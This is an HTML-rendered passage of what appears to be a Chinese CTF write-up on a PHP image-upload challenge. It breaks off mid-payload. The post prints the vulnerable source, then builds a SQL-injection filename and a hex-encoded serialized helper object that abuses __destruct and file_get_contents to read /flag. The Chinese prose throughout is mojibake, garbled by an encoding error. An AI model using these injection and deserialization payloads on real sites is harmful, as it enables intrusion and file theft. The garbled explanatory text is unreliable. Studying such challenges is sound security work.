class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>())&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>])&#123;<br>    <span class="hljs-variable">$attr_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>]);<br><span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$attr_temp</span>);<br>&#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;id=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-string">&quot; filename=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;filename&quot;</span>].<span class="hljs-string">&quot; path=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$this</span>-&gt;con);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Delete_All_Images</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;DELETE FROM images&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$this</span>-&gt;con, <span class="hljs-variable">$sql</span>);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†å¾ˆå¯ç–‘ï¼Œå­˜åœ¨ååºåˆ—åŒ–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>])&#123;<br><span class="hljs-variable">$attr_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>]);<br><span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$attr_temp</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//helper.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$folder</span> = <span class="hljs-string">&quot;pic/&quot;</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = False; <br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;config.txt&quot;</span>;<br><span class="hljs-comment">// The function is not yet perfect, it is not open yet.</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$input</span>=<span class="hljs-string">&quot;file&quot;</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$fileinfo</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getfile</span>(<span class="hljs-variable">$input</span>);<br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;title&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;filename&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;ext&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;ext&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;path&quot;</span>] = <span class="hljs-variable">$fileinfo</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br><span class="hljs-variable">$img_ext</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$input</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br><span class="hljs-variable">$my_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;<span class="hljs-variable">$img_ext</span>[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;<span class="hljs-variable">$img_ext</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-variable">$array</span>[<span class="hljs-string">&quot;attr&quot;</span>] = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$my_ext</span>);<br><span class="hljs-variable">$id</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$array</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span> == <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="hljs-subst">$id</span>.&lt;/p&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))&#123;<br><span class="hljs-variable">$rs</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$input</span>]);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$rs</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$basename</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>().<span class="hljs-title function_ invoke__">uniqid</span>()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<br><span class="hljs-variable">$cate_exts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$cate_exts</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);<br>&#125;<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;<span class="hljs-variable">$title</span>,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;folder.<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data</span> || !<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);<br>&#125;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">insert_array</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$con</span>)) <br>&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>&#125;<br><span class="hljs-variable">$sql_fields</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$sql_val</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br><span class="hljs-variable">$key_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$key</span>);<br><span class="hljs-variable">$value_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$value</span>);<br><span class="hljs-variable">$sql_fields</span>[] = <span class="hljs-string">&quot;`&quot;</span>.<span class="hljs-variable">$key_temp</span>.<span class="hljs-string">&quot;`&quot;</span>;<br><span class="hljs-variable">$sql_val</span>[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$value_temp</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>&#125;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_fields</span>)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_val</span>)).<span class="hljs-string">&quot;)&quot;</span>;<br><span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">mysqli_insert_id</span>(<span class="hljs-variable">$con</span>);<br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;ifview == False)&#123;<br><span class="hljs-keyword">return</span> False;<br><span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span><br>&#125;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-comment"># Read some config html</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">view_files</span>(<span class="hljs-variable">$this</span>-&gt;config);<br>&#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªåºåˆ—åŒ–ï¼š<code>$array[&quot;attr&quot;] = serialize($my_ext);</code></p><p>è¿˜æœ‰<code>file_get_contents</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;ifview == False)&#123;<br><span class="hljs-keyword">return</span> False;<br><span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span><br>&#125;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br></code></pre></td></tr></table></figure><p>upload.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./helper.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">upload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">helper</span> </span>&#123; <span class="hljs-comment">//ç»§æ‰¿helper</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_base</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>();<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>)&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>])&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file failed.&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">upload</span>();<br><span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">upload_base</span>();<br>&#125;<br>&#125;<br><span class="hljs-comment">//newäº†ä¸€ä¸ªuploadç„¶åè°ƒç”¨upload_base()ï¼Œuploadç»§æ‰¿äº†helper</span><br></code></pre></td></tr></table></figure><p>ä¸»è¦åˆ†æ<code>helper.php</code>ï¼š</p><p><code>upload</code> - &gt; <code>getfile</code> - &gt; <code>check</code>ï¼Œ<code>upload</code> - &gt; <code>check</code> -&gt; <code>insert_array</code></p><p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–å¤„ç†çš„æ˜¯å›¾ç‰‡çš„é•¿å®½ã€‚ã€‚ååºåˆ—åŒ–<code>__destruct()</code>ä¼šè°ƒç”¨<code>view_files</code>ç„¶åè°ƒç”¨<code>file_get_contents</code>ã€‚ä¸Šä¼ æ—¶åºåˆ—åŒ–ï¼Œ<code>show</code>æ—¶è§¦å‘ååºåˆ—åŒ–ã€‚ç°åœ¨çš„é—®é¢˜æ˜¯æˆ‘è¦æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªå›¾ç‰‡ä¸Šä¼ ä¿®æ”¹æ•°æ®åº“ä¸­çš„å­˜å‚¨çš„é•¿å®½å­—æ®µå»è§¦å‘<code>show</code>é‡Œçš„ååºåˆ—åŒ–ï¼Ÿè¿™é‡Œé™åˆ¶äº†åç¼€ä½†æ²¡é™åˆ¶æ–‡ä»¶åï¼Œè¿™é‡Œé¢æ˜¯å¦èƒ½<code>SQL</code>æ³¨å…¥ï¼Ÿ</p><p>å‚è€ƒ<code>https://syunaht.com/p/893436503.html</code></p><p>æ³¨æ„è¿™éƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br><span class="hljs-variable">$key_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$key</span>);<br><span class="hljs-variable">$value_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$value</span>);<br><span class="hljs-variable">$sql_fields</span>[] = <span class="hljs-string">&quot;`&quot;</span>.<span class="hljs-variable">$key_temp</span>.<span class="hljs-string">&quot;`&quot;</span>;<br><span class="hljs-variable">$sql_val</span>[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$value_temp</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>&#125;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_fields</span>)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_val</span>)).<span class="hljs-string">&quot;)&quot;</span>;<br></code></pre></td></tr></table></figure><p>å®é™…<code>SQL</code>è¯­å¥å°±æ˜¯ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> images (`title`,`filename`,`ext`,`path`,`attr`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;xx&#x27;</span>,<span class="hljs-string">&#x27;xx&#x27;</span>,<span class="hljs-string">&#x27;xx&#x27;</span>,<span class="hljs-string">&#x27;xx&#x27;</span>,<span class="hljs-string">&#x27;xx&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶åå¯æ§ï¼Œæ„é€ æ–‡ä»¶åä¸ºï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">a<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;payload&#x27;</span>)<span class="hljs-meta">#.jpg</span><br></code></pre></td></tr></table></figure><p>çš„å›¾ç‰‡ã€‚</p><p>åé¢å°±æ˜¯æ€è€ƒå¦‚ä½•åˆ©ç”¨<code>helper.php</code>ä¸­çš„<code>__destruct()</code>å’Œ<code>view_files</code>ã€‚æ³¨æ„ä¸€å¼€å§‹çš„å®šä¹‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = False; <br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;config.txt&quot;</span>;<br></code></pre></td></tr></table></figure><p>æ„é€ ï¼šååºåˆ—åŒ–è‡ªåŠ¨è§¦å‘<code>__destruct()</code>ç„¶åè°ƒç”¨<code>view_files</code></p><p>æ‰€ä»¥å¯ä»¥æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = True;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;/flag&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//æ³¨æ„ifviewå’Œconfigæ˜¯protectedå±æ€§ï¼Œå­˜åœ¨ä¸å¯è§å­—ç¬¦</span><br></code></pre></td></tr></table></figure><p>ä»¥åŠè¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$attr_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>]);<br></code></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠ<code>attr</code>ä¸­çš„<code>ä¸å¯è§*ä¸å¯è§</code>å…¨éƒ¨æ›¿æ¢æˆ<code>\0\0\0</code>äº†ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•ç»•è¿‡ã€‚(ä¸€å¼€å§‹æ²¡æƒ³æ˜ç™½ä¸ºå•¥æœ‰è¿™ä¹ˆä¸€ä¸ª<code>waf</code>ã€‚ã€‚åšåˆ°è¿™é‡Œæ˜ç™½äº†)</p><p>ç„¶åå°±æ˜¯ä¸€ä¸ªå°çŸ¥è¯†ç‚¹ï¼š</p><blockquote><p>mysqlä¼šè‡ªåŠ¨å°†åå…­è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œè¿™ä¹Ÿæ˜¯sqlæ³¨å…¥çš„å¯åˆ©ç”¨ç‚¹</p></blockquote><p>æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = True;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;/flag&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code>ï¼Œæ³¨æ„<code>SQL</code>è¯­å¥ä¸­è¿›åˆ¶æ•°æ®æ²¡å¿…è¦ç”¨å•å¼•å·åŒå¼•å·é—­åˆæœ€åä¸€ä¸ªå­—æ®µ:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 